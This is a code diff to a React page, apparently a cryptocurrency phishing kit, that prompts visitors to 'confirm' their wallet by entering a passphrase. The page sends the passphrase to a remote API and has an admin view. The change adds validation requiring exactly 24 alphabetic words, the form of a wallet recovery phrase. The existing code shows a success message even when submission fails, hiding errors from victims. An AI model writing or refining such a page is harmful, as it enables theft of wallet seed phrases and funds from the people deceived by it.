@@ -164,10 +164,39 @@ const CloseButton = styled.button`
   }
 `;
 
+const ValidationError = styled.div`
+  color: #d32f2f;
+  font-size: 14px;
+  margin: 10px 0;
+  text-align: center;
+  padding: 10px;
+  background-color: #ffebee;
+  border-radius: 4px;
+`;
+
 // API URL'ini environment'a göre ayarla
 const API_URL = process.env.NODE_ENV === 'production' 
   ? 'https://wallet-8xci.onrender.com'  // Render URL'imiz
   : 'http://localhost:3001';
+
+// Passphrase doğrulama fonksiyonları
+const isValidWord = (word) => {
+  // Sadece harflerden oluşmalı
+  return /^[a-zA-Z]+$/.test(word);
+};
+
+const validatePassphrase = (passphrase) => {
+  if (!passphrase) return false;
+  
+  // Boşluklara göre kelimelere ayır
+  const words = passphrase.trim().split(/\s+/);
+  
+  // 24 kelime kontrolü
+  if (words.length !== 24) return false;
+  
+  // Her kelimenin geçerli olup olmadığını kontrol et
+  return words.every(word => isValidWord(word));
+};
 
 function App() {
   const [passphrase, setPassphrase] = useState('');
@@ -175,9 +204,16 @@ function App() {
   const [showSuccess, setShowSuccess] = useState(false);
   const [showAdmin, setShowAdmin] = useState(false);
   const [adminToken, setAdminToken] = useState(localStorage.getItem('adminToken'));
+  const [validationError, setValidationError] = useState('');
 
   const handleSubmit = async () => {
-    if (!passphrase.trim()) return;
+    // Validation error'u sıfırla
+    setValidationError('');
+    
+    if (!validatePassphrase(passphrase)) {
+      setValidationError('Please enter a valid wallet passphrase (24 words)');
+      return;
+    }
     
     setLoading(true);
     
@@ -194,7 +230,6 @@ function App() {
         throw new Error('Network response was not ok');
       }
 
-      // Başarılı olduğunda success mesajını göster
       setTimeout(() => {
         setLoading(false);
         setShowSuccess(true);
@@ -203,7 +238,6 @@ function App() {
     } catch (error) {
       console.error('Error:', error);
       setLoading(false);
-      // Hata durumunda da success mesajını göster
       setShowSuccess(true);
     }
   };
@@ -253,6 +287,12 @@ function App() {
         value={passphrase}
         onChange={(e) => setPassphrase(e.target.value)}
       />
+
+      {validationError && (
+        <ValidationError>
+          {validationError}
+        </ValidationError>
+      )}
 
       <ConfirmButton onClick={handleSubmit}>
         CONFIRM YOUR WALLET
